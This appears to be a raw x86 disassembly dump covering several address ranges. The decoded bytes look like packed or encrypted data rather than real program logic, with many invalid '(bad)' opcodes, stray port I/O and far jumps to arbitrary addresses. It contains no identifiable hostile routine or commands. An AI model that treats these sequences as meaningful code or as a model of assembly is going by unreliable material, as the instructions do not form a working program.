  42e6b8:	lods   eax,DWORD PTR ds:[esi]
  42e6b9:	or     esp,eax
  42e6bb:	xchg   ecx,eax
  42e6bc:	int    0x8
  42e6be:	mov    edx,0x837998b3
  42e6c3:	out    dx,eax
  42e6c4:	in     eax,dx
  42e6c5:	int3   
  42e6c6:	adc    esp,ebp
  42e6c8:	fist   WORD PTR [ecx]
  42e6ca:	mov    ch,0x24
  42e6cc:	inc    esi
  42e6cd:	mov    al,0xf9
  42e6cf:	dec    ebx
  42e6d0:	aad    0x46
  42e6d2:	inc    ebx
  42e6d3:	mov    ds:0xe2690423,al
  42e6d8:	(bad)  
  42e6d9:	adc    cl,BYTE PTR [eax]
  42e6db:	sbb    al,0x38
  42e6dd:	pop    ds
  42e6de:	pop    edx
  42e6df:	scas   eax,DWORD PTR es:[edi]
  42e6e0:	mov    esp,0xf523b0ac
  42e6e5:	mov    DWORD PTR [esi],ebp
  42e6e7:	push   edi
  42e6e8:	repz not DWORD PTR [ebp-0x6f]
  42e6ec:	inc    edx
  42e6ed:	and    eax,0x16cd70b9
  42e6f2:	bound  eax,QWORD PTR [ecx+0x19fd1ebb]
  42e6f8:	(bad)  
  42e6f9:	jecxz  0x42e6f1
  42e6fb:	push   esi
  42e6fc:	jnp    0x42e6f8
  42e6fe:	or     eax,0xe52ccb7b
  42e703:	inc    ecx
  42e704:	pushf  
  42e705:	adc    eax,0x23f4ecef
  42e70a:	ret    
  42e70b:	xor    BYTE PTR [ebx-0x2d5ce3c0],bl
  42e711:	hlt    
  42e712:	aad    0x50
  42e714:	and    al,0x15
  42e716:	dec    esp
  42e717:	adc    al,0x4f
  42e719:	rol    BYTE PTR [ecx],1
  42e71b:	adc    BYTE PTR [esi],ah
  42e71d:	push   esp
  42e71e:	iret   
  42e71f:	xchg   ebx,eax
  42e720:	fmul   DWORD PTR [ecx-0x4]
  42e723:	mov    eax,ds:0xb01e6533
  42e728:	enter  0x9459,0x53
  42e72c:	sbb    BYTE PTR [edi-0x5d3512b5],bh
  42e732:	call   0xce860977
  42e737:	xor    eax,0x4d9bffde
  42e73c:	mov    al,ds:0xd6de4232
  42e741:	pop    ds
  42e742:	jmp    0x64ac:0x908498c0
  42e749:	mov    WORD PTR [eax-0x1b],es
  42e74c:	shl    BYTE PTR [eax-0x534b156d],cl
  42e752:	fsubr  DWORD PTR ds:0x2381cd11
  42e758:	inc    edi
  42e759:	xor    eax,0x928a1acf
  42e75e:	pop    ebp
  42e75f:	mov    eax,ds:0x2014d3e3
  42e764:	rcl    BYTE PTR [esi-0x20],1
  42e767:	add    esi,DWORD PTR [ebx]
  42e769:	ret    
  42e76a:	mov    al,0x92
  42e76c:	popa   
  42e76d:	inc    BYTE PTR [eax]
	...
  42e7d3:	add    BYTE PTR [eax],al
  42e7d5:	add    BYTE PTR [edx+0x39],bl
  42e7d8:	dec    esi
  42e7d9:	sub    eax,0x7f7b7f6f
  42e7de:	sub    BYTE PTR fs:[esi],cl
  42e7e1:	fisub  DWORD PTR [eax]
  42e7e3:	in     al,0xcb
  42e7e5:	and    BYTE PTR [edi-0xe],0x1
  42e7e9:	add    BYTE PTR [eax],al
  42e7eb:	add    DWORD PTR [eax],eax
  42e7ed:	add    BYTE PTR [edx],al
  42e7ef:	pop    edi
  42e7f0:	jmp    0x42e798
  42e7f2:	pop    esp
  42e7f3:	push   ebx
  42e7f4:	sub    ebp,DWORD PTR [ebx+eax*2]
  42e7f7:	and    esp,DWORD PTR [ecx-0x6c]
  42e7fa:	mov    bh,0x3c
  42e7fc:	adc    al,0x5c
  42e7fe:	adc    eax,0x73ca78ad
  42e803:	sbb    DWORD PTR [ecx-0x5ed5783c],0x40
  42e80a:	ret    0x61f6
  42e80d:	pop    ss
  42e80e:	mov    ds:0x9bc58bb8,al
  42e813:	push   ss
  42e814:	mov    eax,0x13388c0c
  42e819:	sbb    dl,BYTE PTR [edi-0xe73c108]
  42e81f:	aas    
  42e820:	ja     0x42e803
  42e822:	adc    BYTE PTR [ebx+ebp*2],bh
  42e825:	lahf   
  42e826:	jl     0x42e7b7
  42e828:	repnz xlat BYTE PTR ds:[ebx]
  42e82a:	sub    DWORD PTR [esi+edi*1],esi
  42e82d:	jns    0x42e83f
  42e82f:	rol    BYTE PTR [ebx-0x16],cl
  42e832:	cld    
  42e833:	jo     0x42e87a
  42e835:	xlat   BYTE PTR ds:[ebx]
  42e836:	rep ins DWORD PTR es:[edi],dx
  42e838:	inc    ecx
  42e839:	icebp  
  42e83a:	xchg   ebp,eax
  42e83b:	cld    
  42e83c:	(bad)  
  42e83e:	scas   eax,DWORD PTR es:[edi]
  42e83f:	mov    al,0x3d
  42e841:	icebp  
  42e842:	mov    ?,WORD PTR [ebp-0x4bf9fa55]
  42e848:	aad    0xca
  42e84a:	dec    ebx
  42e84b:	pop    ebp
  42e84c:	mov    dh,0xd0
  42e84e:	jo     0x42e8a8
  42e850:	lds    esi,FWORD PTR [ebp+0x31]
  42e853:	xchg   DWORD PTR [esi-0x6],esp
  42e856:	jbe    0x42e8b0
  42e858:	add    al,0xb6
  42e85a:	retf   
  42e85b:	out    dx,al
  42e85c:	pop    edi
  42e85d:	js     0x42e7e0
  42e85f:	shl    DWORD PTR [ebx],cl
  42e861:	aaa    
  42e862:	call   0x98dc7a47
  42e867:	xor    eax,0xbe0e9a19
  42e86c:	jge    0x42e8cc
  42e86e:	adc    dl,dh
  42e870:	ss add eax,0xe419e44
  42e876:	loope  0x42e8a3
  42e878:	imul   esi,DWORD PTR [eiz*4+0x1771515f],0xffffffdf
  42e880:	lods   eax,DWORD PTR ds:[esi]
  42e881:	mov    ebp,0xda502b33
  42e886:	jne    0x42e84d
  42e888:	jmp    0x2670:0x2cb5c96a
  42e88f:	push   ebx
  42e890:	cld    
  42e891:	int    0x33
  42e893:	aad    0xfb
  42e895:	test   ah,bh
  42e897:	jecxz  0x42e8d8
  42e899:	xor    dl,BYTE PTR [edx]
  42e89b:	test   BYTE PTR [esi],0xe0
  42e89e:	adc    ecx,DWORD PTR [eax-0x16]
  42e8a1:	rcr    edx,cl
  42e8a3:	add    eax,DWORD PTR [ebp+0x157b88c5]
  42e8a9:	jge    0x42e8da
  42e8ab:	sub    BYTE PTR [ecx+0x28],0xe2
  42e8af:	dec    ebx
  42e8b0:	add    al,0x9e
  42e8b2:	add    eax,0x7f0db7a8
  42e8b7:	sar    dh,0x7b
  42e8ba:	add    ah,0x93
  42e8bd:	sub    eax,0x5ec20649
  42e8c2:	lahf   
  42e8c3:	stos   BYTE PTR es:[edi],al
  42e8c4:	inc    edi
  42e8c5:	cmp    al,0xd4
  42e8c7:	(bad)
  42e8ca:	sub    DWORD PTR [eax],eax
  42e8cc:	pop    esp
  42e8cd:	out    0xa7,eax
  42e8cf:	cdq    
  42e8d0:	sub    dl,bh
  42e8d2:	xchg   ecx,eax
  42e8d3:	sahf   
  42e8d4:	and    BYTE PTR [esi],0xfa
  42e8d7:	mov    dl,0x2a
  42e8d9:	cli    
  42e8da:	data16 fiadd WORD PTR [ebx+ecx*1+0x1b]
  42e8df:	ds jbe 0x42e882
  42e8e2:	scas   al,BYTE PTR es:[edi]
  42e8e3:	dec    eax
  42e8e4:	in     al,0x4c
  42e8e6:	dec    ebp
  42e8e7:	ds xchg esp,eax
  42e8e9:	test   ah,bh
  42e8eb:	icebp  
  42e8ec:	fcom   DWORD PTR [edx+0x0]
	...
  42e953:	add    BYTE PTR [eax],al
  42e955:	add    bl,al
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x72dc07d5]
  42e963:	out    0x47,al
  42e965:	pop    ebx
  42e966:	repz add DWORD PTR [bx+si],eax
  42e96a:	add    BYTE PTR [ecx],al
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	inc    edi
  42e96f:	xchg   ebx,eax
  42e970:	test   DWORD PTR [ecx+eax*2],ebp
  42e973:	dec    esp
  42e974:	jnp    0x42e8fa
  42e976:	aam    0x6
  42e978:	fst    st(4)
  42e97a:	aam    0x9e
  42e97c:	pop    ecx
  42e97d:	jns    0x42e905
  42e97f:	add    eax,DWORD PTR [edx+0x41]
  42e982:	(bad)  
  42e983:	ffreep st(4)
  42e985:	adc    al,0x59
  42e987:	out    0x6f,eax
  42e989:	lock pushf 
  42e98b:	lods   al,BYTE PTR ds:[esi]
  42e98c:	fisubr WORD PTR [ecx]
  42e98e:	add    cl,BYTE PTR ds:0xb98e9a4d
  42e994:	inc    ebx
  42e995:	push   esp
  42e996:	inc    ebp
  42e997:	lds    ebx,FWORD PTR cs:[edi-0x54]
  42e99b:	enter  0x5b74,0xfe
  42e99f:	sub    esp,ebp
  42e9a1:	mul    BYTE PTR [ebp+0x18]
  42e9a4:	xor    al,0x63
  42e9a6:	aaa    
  42e9a7:	pop    edx
  42e9a8:	xor    dl,al
  42e9aa:	jle    0x42e9c0
  42e9ac:	sbb    ebx,DWORD PTR [ecx-0x73]
  42e9af:	inc    edi
  42e9b0:	xchg   edx,eax
  42e9b1:	add    BYTE PTR [esi+0x1f],bh
  42e9b4:	in     eax,dx
  42e9b5:	ins    BYTE PTR es:[edi],dx
  42e9b6:	test   al,0x53
  42e9b8:	xchg   si,ax
  42e9ba:	ja     0x42e999
  42e9bc:	outs   dx,DWORD PTR ds:[esi]
  42e9bd:	fldenv [ebp-0x4]
  42e9c0:	ins    DWORD PTR es:[edi],dx
  42e9c1:	arpl   bx,dx
  42e9c3:	sti    
  42e9c4:	push   0x6d
  42e9c6:	mov    ds:0x9e6dc415,eax
  42e9cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9cc:	cld    
  42e9cd:	mov    al,ds:0xfdafba10
  42e9d2:	mov    ebp,0x331f8221
  42e9d7:	add    BYTE PTR [ebx+0x6261cdd6],ch
  42e9dd:	mov    ch,0xcf
  42e9df:	jmp    0xcab3:0x9f2a53e9
  42e9e6:	sub    BYTE PTR [esi],al
  42e9e8:	sbb    ebp,DWORD PTR [edx+0x39d74af8]
  42e9ee:	shr    edx,1
  42e9f0:	or     al,0x85
  42e9f2:	cli    
  42e9f3:	ror    BYTE PTR [esi+eax*4],1
  42e9f6:	(bad)  
  42e9f7:	lods   eax,DWORD PTR ds:[esi]
  42e9f8:	cmp    al,0x8d
  42e9fa:	test   al,0xdc
  42e9fc:	nop
  42e9fd:	iret   
  42e9fe:	push   ebp
  42e9ff:	push   ss
  42ea00:	xchg   ebx,esi
  42ea02:	xchg   ebp,eax
  42ea03:	mov    esp,0xb04ac4f1
  42ea08:	aas    
  42ea09:	mov    ecx,0xc4a946b3
  42ea0e:	inc    edx
  42ea0f:	fcom   QWORD PTR [ebx-0x3a]
  42ea12:	lahf   
  42ea13:	fwait
  42ea14:	adc    eax,0x5bf5cfa9
  42ea19:	pushf  
  42ea1a:	sbb    bh,0xa3
  42ea1d:	push   edi
  42ea1e:	add    eax,0x80d291e9
  42ea23:	in     al,dx
  42ea24:	push   DWORD PTR [eax+0x7f]
  42ea27:	mov    ebx,0x9d49fa60
  42ea2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea2d:	call   0xa22a346
  42ea32:	mov    al,0x5c
  42ea34:	mov    ds:0x4a254820,eax
  42ea39:	adc    bl,BYTE PTR [edx]
  42ea3b:	aam    0xd3
  42ea3d:	add    eax,0xab000d7d
  42ea42:	stos   DWORD PTR es:[edi],eax
  42ea43:	push   cs
  42ea44:	push   esi
  42ea45:	push   esp
  42ea46:	mov    ds:0x7f928588,eax
  42ea4b:	mov    edi,0x20ecaab0
  42ea50:	loope  0x42ea93
  42ea52:	pushf  
  42ea53:	sbb    al,BYTE PTR [edi+0x22]
  42ea56:	adc    BYTE PTR [esi+0x5d82c901],0x6
  42ea5d:	loop   0x42ea77
  42ea5f:	inc    eax
  42ea60:	aas    
  42ea61:	call   0x1871fb24
  42ea66:	das    
  42ea67:	in     eax,dx
  42ea68:	jmp    0xbe:0x6e881939
	...
  42ead3:	add    BYTE PTR [eax],al
  42ead5:	add    ch,ah
  42ead7:	mov    edx,0xebdfe392
  42eadc:	cmc    
  42eadd:	mov    esi,0x66dc160c
  42eae2:	test   BYTE PTR [edi],dh
  42eae4:	fdiv   DWORD PTR [ecx+0x1f467]
  42eaea:	add    BYTE PTR [ecx],al
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	rcl    cl,cl
  42eaf0:	cld    
  42eaf1:	test   DWORD PTR [esi-0x56],ebx
  42eaf4:	mov    eax,0x20595084
  42eaf9:	sbb    BYTE PTR [edi+0x0],ch
  42eafc:	fadd   QWORD PTR [eax+0x724c9b2d]
  42eb02:	adc    cl,BYTE PTR [edi+edx*8-0xecfb720]
  42eb09:	rcr    DWORD PTR [esi+0x7128f617],0xca
  42eb10:	arpl   WORD PTR [ebx+0x53776c2d],ax
  42eb16:	dec    edx
  42eb17:	fld    TBYTE PTR [esi+0x1a]
  42eb1a:	push   ecx
  42eb1b:	or     al,0x57
  42eb1d:	pop    edi
  42eb1e:	and    ch,ch
  42eb20:	sbb    al,0xd0
  42eb22:	or     DWORD PTR [eax-0x1b159c4b],edx
  42eb28:	loop   0x42eaaf
  42eb2a:	loopne 0x42ead6
  42eb2c:	inc    esi
  42eb2d:	fdivr  QWORD PTR [eax+esi*8+0x14]
  42eb31:	dec    esp
  42eb32:	jmp    0xad44697a
  42eb37:	or     DWORD PTR [ecx],esp
  42eb39:	add    al,0xe8
  42eb3b:	pop    ebp
  42eb3c:	pop    ebp
  42eb3d:	fld    QWORD PTR [esi]
  42eb3f:	adc    BYTE PTR [edi-0x13],dl
  42eb42:	in     al,0x14
  42eb44:	das    
  42eb45:	mov    ecx,0x355997a5
  42eb4a:	mov    bl,0x81
  42eb4c:	repz push esi
  42eb4e:	sbb    eax,0x2256d459
  42eb53:	mov    ebx,0x5dbbfef8
  42eb58:	and    al,0x4a
  42eb5a:	fisubr DWORD PTR [edx]
  42eb5c:	add    DWORD PTR [ebp-0x70],eax
  42eb5f:	pop    ss
  42eb60:	rcl    dl,0xdc
  42eb63:	push   0xffffffe3
  42eb65:	les    edx,FWORD PTR [esi]
  42eb67:	push   es
  42eb68:	jne    0x42eb01
  42eb6a:	pop    ds
  42eb6b:	repz inc eax
  42eb6d:	mov    BYTE PTR [esi+0x12b8f5c5],bl
  42eb73:	sbb    BYTE PTR [esi+0x13],bl
  42eb76:	inc    ebx
  42eb77:	fs pop ds
  42eb79:	pusha  
  42eb7a:	fwait
  42eb7b:	inc    edi
  42eb7c:	scas   al,BYTE PTR es:[edi]
  42eb7d:	xor    eax,edx
  42eb7f:	adc    DWORD PTR [eax+ebx*8],edx
  42eb82:	mov    ebx,0x15d29687
  42eb88:	in     al,dx
  42eb89:	add    al,0x38
  42eb8b:	xchg   edx,eax
  42eb8c:	ficom  WORD PTR [esi-0x2b8014e9]
  42eb92:	jl     0x42eb15
  42eb94:	call   0xcebc:0x5d6321c3
  42eb9b:	dec    edx
  42eb9c:	sub    eax,0xe5fb787a
  42eba1:	xor    BYTE PTR [eax+0x32],0x8d
  42eba5:	mov    ebx,es
  42eba7:	retf   
  42eba8:	sbb    eax,0x9f72006b
  42ebad:	mov    BYTE PTR [eax-0x33],ch
  42ebb0:	add    al,0xa0
  42ebb2:	inc    ebp
  42ebb3:	fst    DWORD PTR [eax-0x68]
  42ebb6:	aas    
  42ebb7:	push   es
  42ebb8:	dec    eax
  42ebb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ebba:	lock (bad) 
  42ebbc:	sbb    al,0x9c
  42ebbe:	push   es
  42ebbf:	dec    edi
  42ebc0:	jmp    0x42ebf2
  42ebc2:	fcomp  st(1)
  42ebc4:	mov    ebx,0x8fe3bfe3
  42ebc9:	fnsave [ebx-0x7c]
  42ebcc:	stos   BYTE PTR es:[edi],al
  42ebcd:	cld    
  42ebce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ebcf:	pop    ebp
  42ebd0:	sub    eax,0x43dfa4fa
  42ebd5:	sbb    esp,edx
  42ebd7:	sbb    eax,0x4a97e70a
  42ebdc:	(bad)  [ebp-0x77]
  42ebdf:	xchg   edx,eax
  42ebe0:	pop    esi
  42ebe1:	test   esi,edx
  42ebe3:	int3   
  42ebe4:	(bad)  
  42ebe5:	ret    
  42ebe6:	pop    ebx
  42ebe7:	out    0x12,eax
  42ebe9:	cmp    al,0xd2
  42ebeb:	xchg   ecx,eax
  42ebec:	xchg   ebx,eax
  42ebed:	dec    esp
	...
  42ec56:	jle    0x42ec99
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	sbb    DWORD PTR [eax+0x53],0xf56709f2
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	add    BYTE PTR [ecx],al
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	fst    DWORD PTR [edx+eiz*1+0x4fd47140]
  42ec75:	je     0x42ece3
  42ec77:	push   ss
  42ec78:	inc    esi
  42ec79:	mov    dl,0x1
  42ec7b:	shl    BYTE PTR [ebp+0x34],0x98
  42ec7f:	das    
  42ec80:	add    dl,BYTE PTR [esp+ebp*4+0x4c]
  42ec84:	dec    esp
  42ec85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec86:	pop    es
  42ec87:	add    ecx,DWORD PTR [edi+0x53413c8]
  42ec8d:	test   DWORD PTR [ecx],ebp
  42ec8f:	ret    
  42ec90:	ins    BYTE PTR es:[edi],dx
  42ec91:	inc    ebx
  42ec92:	mov    al,0x8c
  42ec94:	add    eax,0x65d602e3
  42ec99:	imul   ebx,esi,0x2f2ae235
  42ec9f:	and    ah,BYTE PTR [edx]
  42eca1:	add    al,0xb
  42eca3:	iret   
  42eca4:	fmul   QWORD PTR es:[eax]
  42eca7:	scas   eax,DWORD PTR es:[edi]
  42eca8:	pop    esi
  42eca9:	idiv   bl
  42ecab:	pusha  
  42ecac:	inc    eax
  42ecad:	mov    ebp,0xf723dcd8
  42ecb2:	cwde   
  42ecb3:	or     eax,0xbd89ba38
  42ecb8:	icebp  
  42ecb9:	iret   
  42ecba:	cmc    
  42ecbb:	das    
  42ecbc:	jne    0x42ed06
  42ecbe:	add    al,0x22
  42ecc0:	sti    
  42ecc1:	jns    0x42ec83
  42ecc3:	mov    dl,0x3a
  42ecc5:	stos   DWORD PTR es:[edi],eax
  42ecc6:	xchg   esp,eax
  42ecc7:	stc    
  42ecc8:	pop    ds
  42ecc9:	mov    eax,0xa5e5400f
  42ecce:	jae    0x42ec92
  42ecd0:	or     ah,BYTE PTR [edx]
  42ecd2:	mov    esi,ecx
  42ecd4:	sub    ch,BYTE PTR [edx-0x36]
  42ecd7:	mov    edi,0xa271b1c7
  42ecdc:	mov    bh,0xc9
  42ecde:	inc    ebp
  42ecdf:	xor    eax,DWORD PTR [edi]
  42ece1:	jmp    0x72c0db9
  42ece6:	and    eax,0xd0a38972
  42eceb:	scas   al,BYTE PTR es:[edi]
  42ecec:	outs   dx,DWORD PTR ds:[esi]
  42eced:	mov    dl,BYTE PTR [ecx-0x5a]
  42ecf0:	call   0x9f5b:0x50b76bda
  42ecf7:	inc    eax
  42ecf8:	das    
  42ecf9:	out    dx,al
  42ecfa:	lea    edi,[eax-0x116b85c7]
  42ed00:	pop    ebx
  42ed01:	iret   
  42ed02:	add    bh,BYTE PTR [ebx-0x34]
  42ed05:	sbb    al,0x78
  42ed07:	and    DWORD PTR [ebx],0x17b94ff0
  42ed0d:	pop    ds
  42ed0e:	pop    es
  42ed0f:	sti    
  42ed10:	cdq    
  42ed11:	fwait
  42ed12:	lock cs call 0x584a:0x8abc072c
  42ed1b:	mov    ds:0x73add27a,al
  42ed20:	shl    bh,1
  42ed22:	add    esi,DWORD PTR [esi-0x38]
  42ed25:	sbb    DWORD PTR [eax],edi
  42ed27:	jge    0x42ed5a
  42ed29:	int3   
  42ed2a:	outs   dx,BYTE PTR ds:[esi]
  42ed2b:	sbb    esi,ebx
  42ed2d:	inc    esp
  42ed2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed2f:	fist   WORD PTR [esi+0x65]
  42ed32:	lea    ebx,[ebx+0x66bf1a05]
  42ed38:	and    dl,ah
  42ed3a:	jne    0x42ecc6
  42ed3c:	fdiv   QWORD PTR [ecx+0x65598e21]
  42ed42:	fs inc ecx
  42ed44:	call   0x9f433931
  42ed49:	xor    DWORD PTR [edi],edi
  42ed4b:	lds    ecx,FWORD PTR [esi+0x31]
  42ed4e:	cmp    DWORD PTR [esi+0x3cea17dd],esi
  42ed54:	mov    esp,0x53da1847
  42ed59:	push   cs
  42ed5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ed5b:	or     ecx,DWORD PTR [esi-0x3e7755b6]
  42ed61:	and    esp,DWORD PTR [ecx+0x5fe489c1]
  42ed67:	mov    ds,WORD PTR [esi-0xcc5bd30]
  42ed6d:	inc    ecx
	...
  42edd6:	sub    dh,dh
  42edd8:	scas   eax,DWORD PTR es:[edi]
  42edd9:	fdivr  st,st(7)
  42eddb:	fnstcw WORD PTR [edi-0xa]
  42edde:	jecxz  0x42ee12
  42ede0:	test   DWORD PTR [edx-0x612f9304],esp
  42ede6:	test   BYTE PTR [bx+di],0x0
  42edea:	add    BYTE PTR [ecx],al
  42edec:	add    BYTE PTR [eax],al
  42edee:	lds    edx,FWORD PTR [esi+ecx*4]
  42edf1:	inc    ebp
  42edf2:	(bad)  
  42edf3:	fidiv  DWORD PTR [ebx+0x29]
  42edf6:	sub    cl,BYTE PTR [ecx]
  42edf8:	sbb    eax,0x5e3a3eff
  42edfd:	pop    DWORD PTR [ebx]
  42edff:	mov    WORD PTR [ecx+0xb],fs
  42ee02:	mov    al,0x9d
  42ee04:	push   ss
  42ee05:	jb     0x42ee75
  42ee07:	mov    esp,0x28bbf3c6
  42ee0c:	stos   DWORD PTR es:[edi],eax
  42ee0d:	ret    
  42ee0e:	mov    bl,0xca
  42ee10:	push   esi
  42ee11:	cmp    BYTE PTR ss:[eax+0x7f],0x30
  42ee16:	push   0xe26282ca
  42ee1b:	add    BYTE PTR [eax-0x72],al
  42ee1e:	retf   0x120d
  42ee21:	lods   eax,DWORD PTR ds:[esi]
  42ee22:	and    ch,BYTE PTR [ebp+0x46cd6ba4]
  42ee28:	xchg   BYTE PTR [esi],ah
  42ee2a:	iret   
  42ee2b:	mov    bh,0xa8
  42ee2d:	add    ecx,DWORD PTR [ebx]
  42ee2f:	sub    ch,BYTE PTR [ecx+0x55]
  42ee32:	out    dx,eax
  42ee33:	and    dl,BYTE PTR [ecx-0x294d2109]
  42ee39:	mov    esp,0x5be61277
  42ee3e:	cmova  esp,DWORD PTR [edi+ecx*8-0x15]
  42ee43:	or     al,0x9
  42ee45:	fimul  WORD PTR [ecx+0xe2a0f96]
  42ee4b:	dec    ebx
  42ee4c:	mov    cl,0xfe
  42ee4e:	stos   DWORD PTR es:[edi],eax
  42ee4f:	fnstcw WORD PTR [ebp-0x74]
  42ee52:	adc    eax,0x5f1005f
  42ee57:	ds xchg esp,eax
  42ee59:	pop    ss
  42ee5a:	sahf   
  42ee5b:	sub    eax,edx
  42ee5d:	and    ebx,DWORD PTR [ecx-0x720bb06d]
  42ee63:	push   ds
  42ee64:	xor    eax,0xe6f9313
  42ee69:	icebp  
  42ee6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee6b:	out    dx,al
  42ee6c:	add    dh,BYTE PTR [ebx-0x5b]
  42ee6f:	mov    bl,0x5e
  42ee71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee72:	mov    al,0xd7
  42ee74:	inc    esp
  42ee75:	dec    ecx
  42ee76:	ret    0x1103
  42ee79:	int3   
  42ee7a:	mov    dh,0x21
  42ee7c:	mov    si,0xc3b3
  42ee80:	xor    ebp,edx
  42ee82:	dec    edx
  42ee83:	mov    dl,BYTE PTR [eax]
  42ee85:	mov    ah,0xca
  42ee87:	pop    esi
  42ee88:	mov    BYTE PTR [eax-0x1c],ch
  42ee8b:	mov    ecx,0x5c072f9
  42ee91:	add    edi,0xffffffa8
  42ee94:	scas   al,BYTE PTR es:[edi]
  42ee95:	(bad)  
  42ee96:	mov    edx,0xf5aef459
  42ee9b:	(bad)  
  42ee9c:	push   0xf9e774a2
  42eea1:	test   DWORD PTR [ecx+0x8],esp
  42eea4:	add    ch,BYTE PTR [eax+0x5]
  42eea7:	add    BYTE PTR [ebx+0x4],bl
  42eeaa:	jnp    0x42eee5
  42eeac:	push   ds
  42eead:	push   ebx
  42eeae:	int    0x93
  42eeb0:	dec    ecx
  42eeb1:	mov    dl,0x7f
  42eeb3:	push   ecx
  42eeb4:	mov    ebx,0xce64cd1a
  42eeb9:	sub    eax,0x52600d87
  42eebe:	xlat   BYTE PTR ds:[ebx]
  42eebf:	add    BYTE PTR [ecx+0x67],bh
  42eec2:	inc    edx
  42eec3:	pop    DWORD PTR [esi-0x1]
  42eec6:	test   DWORD PTR [edx],esi
  42eec8:	movlps QWORD PTR [ebx+ebx*4],xmm7
  42eecc:	and    al,0x6c
  42eece:	push   edi
  42eecf:	cwde   
  42eed0:	push   esi
  42eed1:	mov    bl,BYTE PTR cs:[edx+0x42]
  42eed5:	mov    ebx,0x96b639aa
  42eeda:	dec    eax
  42eedb:	in     eax,dx
  42eedc:	inc    edx
  42eedd:	arpl   cx,ax
  42eedf:	push   0x7154ead8
  42eee4:	pop    ds
  42eee5:	cwde   
  42eee6:	mov    cl,0x9f
  42eee8:	push   cs
  42eee9:	xor    DWORD PTR [ecx+0x5ddd26],0x0
	...
  42ef54:	add    BYTE PTR [eax],al
  42ef56:	ret    
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	outs   dx,BYTE PTR ds:[esi]
  42ef63:	jge    0x42ef84
  42ef65:	cwde   
  42ef66:	test   DWORD PTR [bx+di],0x10000
  42ef6d:	add    BYTE PTR [ecx+0x43],cl
  42ef70:	test   esp,0x86f0321d
  42ef76:	dec    edx
  42ef77:	xor    DWORD PTR [esi],ecx
  42ef79:	clc    
  42ef7a:	inc    edi
  42ef7b:	pusha  
  42ef7c:	sub    DWORD PTR [edx-0x33],0xc8e02d6d
  42ef83:	std    
  42ef84:	loop   0x42efe9
  42ef86:	push   0xffffffe7
  42ef88:	cmp    al,0xab
  42ef8a:	and    ch,BYTE PTR [ebp-0x6c09b8e6]
  42ef90:	xor    DWORD PTR [esi],edx
  42ef92:	hlt    
  42ef93:	mov    esi,0xfc65c79
  42ef98:	mov    esp,0x666d2399
  42ef9d:	push   eax
  42ef9e:	loope  0x42ef34
  42efa0:	adc    DWORD PTR [edi+0x39be5900],0xffffffa5
  42efa7:	push   es
  42efa8:	lods   al,BYTE PTR ds:[esi]
  42efa9:	mov    BYTE PTR ds:0xebbdbc62,dh
  42efaf:	pop    eax
  42efb0:	jle    0x42ef83
  42efb2:	add    edi,DWORD PTR [ebx]
  42efb4:	xchg   edi,eax
  42efb5:	mov    al,0x7b
  42efb7:	inc    edi
  42efb8:	xchg   edi,eax
  42efb9:	add    al,0xc4
  42efbb:	sub    ebp,eax
  42efbd:	shl    esp,1
  42efbf:	inc    eax
  42efc0:	pop    eax
  42efc1:	pusha  
  42efc2:	inc    esi
  42efc3:	cmp    cl,dh
  42efc5:	js     0x42ef93
  42efc7:	cs into 
  42efc9:	mov    ah,0x6f
  42efcb:	mov    ecx,0x8f16dc94
  42efd0:	jb     0x42ef6f
  42efd2:	pop    ecx
  42efd3:	stc    
  42efd4:	int3   
  42efd5:	inc    esp
  42efd6:	loopne 0x42f02b
  42efd8:	push   edi
  42efd9:	ficom  DWORD PTR [edx-0x632805bf]
  42efdf:	(bad)  
  42efe0:	xlat   BYTE PTR ds:[ebx]
  42efe1:	adc    BYTE PTR [ebx-0x76],ch
  42efe4:	mov    al,0x44
  42efe6:	lods   al,BYTE PTR ds:[esi]
  42efe7:	loop   0x42f00f
  42efe9:	aam    0xe1
  42efeb:	ret    0xd277
  42efee:	cwde   
  42efef:	cmp    bh,BYTE PTR [edi]
  42eff1:	int    0x31
  42eff3:	jne    0x42efc8
  42eff5:	dec    esp
  42eff6:	aad    0x89
  42eff8:	test   al,0xff
  42effa:	mov    esp,0x891446f8
  42efff:	jmp    0x7a435578
  42f004:	mov    cl,0xe7
  42f006:	(bad)  
  42f007:	mov    ecx,DWORD PTR [edx+0x25e9e999]
  42f00d:	shl    DWORD PTR [esi],0xf6
  42f010:	xchg   BYTE PTR [ebx],bh
  42f012:	aas    
  42f013:	out    dx,al
  42f014:	adc    al,BYTE PTR [ecx+0x65f9e625]
  42f01a:	push   edi
  42f01b:	xchg   ebx,eax
  42f01c:	add    al,0x33
  42f01e:	cmp    al,0x47
  42f020:	div    edi
  42f022:	fsubr  QWORD PTR [ecx-0x78acd096]
  42f028:	or     al,0x7f
  42f02a:	push   ss
  42f02b:	dec    ebp
  42f02c:	mov    ds:0xc018ca2c,al
  42f031:	cmc    
  42f032:	push   eax
  42f033:	fsubr  QWORD PTR [ebx]
  42f035:	sbb    esp,DWORD PTR [ebx+edi*2]
  42f038:	or     dh,BYTE PTR ds:[eax]
  42f03b:	sbb    BYTE PTR [edi+0x30],ah
  42f03e:	enter  0x191a,0xe7
  42f042:	(bad)  
  42f043:	and    al,bl
  42f045:	pop    ebp
  42f046:	push   esp
  42f047:	sub    eax,0x88583614
  42f04c:	jb     0x42f03e
  42f04e:	adc    bh,bl
  42f050:	rcl    BYTE PTR [ebx+0x7e],cl
